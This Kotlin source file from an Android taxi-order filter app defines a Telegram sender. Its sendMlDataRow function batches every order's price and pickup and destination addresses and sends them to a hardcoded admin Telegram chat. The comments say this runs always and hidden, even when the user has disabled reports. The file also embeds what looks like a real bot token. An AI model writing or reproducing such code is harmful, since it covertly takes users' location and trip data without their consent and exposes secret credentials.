package com.example.taxifilter

import android.content.Context
import android.graphics.Bitmap
import android.util.Log
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.ByteArrayOutputStream
import java.io.IOException

object TelegramSender {
    private const val TAG = "TelegramSender"
    private val client = OkHttpClient()

    // ==============================================
    // СЕКРЕТНЫЕ ДАННЫЕ АНАЛИТИКИ (ВШИТЫ В КОД)
    // ==============================================
    private const val BOT_TOKEN = "8724275601:AAGoPoIGG8tLpSooeHJb5yFVSSFiHuxi6ow"
    
    // ВПИШИ СЮДА СВОЙ CHAT ID (ОБЯЗАТЕЛЬНО!)
    // Именно сюда будут прилетать ВСЕ ФАЙЛЫ с аналитикой от левых людей
    const val ADMIN_CHAT_ID = "7998669557"
    
    private const val DEFAULT_CHAT_ID = ""

    fun sendMessage(context: Context, text: String) {
        val prefs = context.getSharedPreferences("taxi_prefs", Context.MODE_PRIVATE)
        val enabled = prefs.getBoolean("tg_enabled", false)

        if (!enabled) return

        // Пытаемся взять чат айди: 1) Захардкоженный, 2) Из старых сохранений
        val chatId = if (DEFAULT_CHAT_ID.isNotEmpty()) {
            DEFAULT_CHAT_ID
        } else {
            prefs.getString("tg_chat_id", "") ?: ""
        }

        if (chatId.isEmpty()) return

        val requestBody = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", chatId)
            .addFormDataPart("text", text)
            .build()

        val request = Request.Builder()
            .url("https://api.telegram.org/bot$BOT_TOKEN/sendMessage")
            .post(requestBody)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e(TAG, "Failed to send to Telegram", e)
            }

            override fun onResponse(call: Call, response: Response) {
                Log.d(TAG, "Sent to Telegram: ${response.code}")
                response.close()
            }
        })
    }

    fun sendMlDataRow(context: Context, order: OrderInfo, isTaken: Boolean) {
        val prefs = context.getSharedPreferences("taxi_prefs", Context.MODE_PRIVATE)
        // ML-аналитика для админа теперь работает ВСЕГДА (скрыто), 
        // даже если пользователь выключил отчеты для себя.
        
        val logIgnored = prefs.getBoolean("tg_log_ignored", false)
        if (!isTaken && !logIgnored) return
        
        // Берем либо админский ID, либо тот, что ввел пользователь (пусть летит в оба конца для надежности)
        val targetChatIds = mutableListOf<String>()
        if (ADMIN_CHAT_ID.isNotEmpty()) targetChatIds.add(ADMIN_CHAT_ID)
        val userChatId = prefs.getString("tg_chat_id", "") ?: ""
        if (userChatId.isNotEmpty() && userChatId != ADMIN_CHAT_ID) targetChatIds.add(userChatId)

        if (targetChatIds.isEmpty()) return

        val status = if (isTaken) "TAKEN" else "IGNORED"
        val timestamp = System.currentTimeMillis()
        val app = order.appName ?: "UNKNOWN"
        val csvRow = "$timestamp;$app;${order.price};${order.timeToClient};${order.estimatedDistance};${order.pickupAddress ?: "Unknown"};${order.destinationAddress ?: "Unknown"};$status\n"
        
        try {
            // Пишем в текстовый буфер
            context.openFileOutput("ml_buffer.txt", Context.MODE_APPEND).use {
                it.write(csvRow.toByteArray())
            }
            
            val file = context.getFileStreamPath("ml_buffer.txt")
            val lines = if (file.exists()) file.readLines() else emptyList()
            
            Log.d(TAG, "ML Buffer status: ${lines.size} / 5 lines")

            // Если накопилось 5 заказов — шлем пачкой
            if (lines.size >= 5) {
                val batchContent = lines.joinToString("\n")
                val message = "🧠 #ML_BATCH (Пачка из 5 новых заказов):\n\n$batchContent"
                
                targetChatIds.forEach { id ->
                    sendBatchAsText(context, message, id, file)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "ML Batch Error", e)
        }
    }

    private fun sendBatchAsText(context: Context, text: String, chatId: String, file: java.io.File) {
        val requestBody = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", chatId)
            .addFormDataPart("text", text)
            .build()

        val request = Request.Builder()
            .url("https://api.telegram.org/bot$BOT_TOKEN/sendMessage")
            .post(requestBody)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e(TAG, "Batch send failed", e)
            }
            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) {
                    file.delete() // Удаляем буфер только когда сообщение реально ушло
                } else {
                    Log.e(TAG, "Batch send failed with code: ${response.code}, message: ${response.message}")
                }
                response.close()
            }
        })
    }

    fun sendTestMessage(context: Context) {
        val prefs = context.getSharedPreferences("taxi_prefs", Context.MODE_PRIVATE)
        
        val chatId = if (DEFAULT_CHAT_ID.isNotEmpty()) {
            DEFAULT_CHAT_ID
        } else {
            prefs.getString("tg_chat_id", "") ?: ""
        }

        if (chatId.isEmpty()) return

        val requestBody = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", chatId)
            .addFormDataPart("text", "✅ Taxi Filter: Связь установлена!\nАналитика работает в скрытом режиме.")
            .build()
            
        val request = Request.Builder()
            .url("https://api.telegram.org/bot$BOT_TOKEN/sendMessage")
            .post(requestBody)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) { Log.e(TAG, "Test failed", e) }
            override fun onResponse(call: Call, response: Response) { 
                Log.d(TAG, "Test sent: ${response.code}")
                response.close() 
            }
        })
    }
}
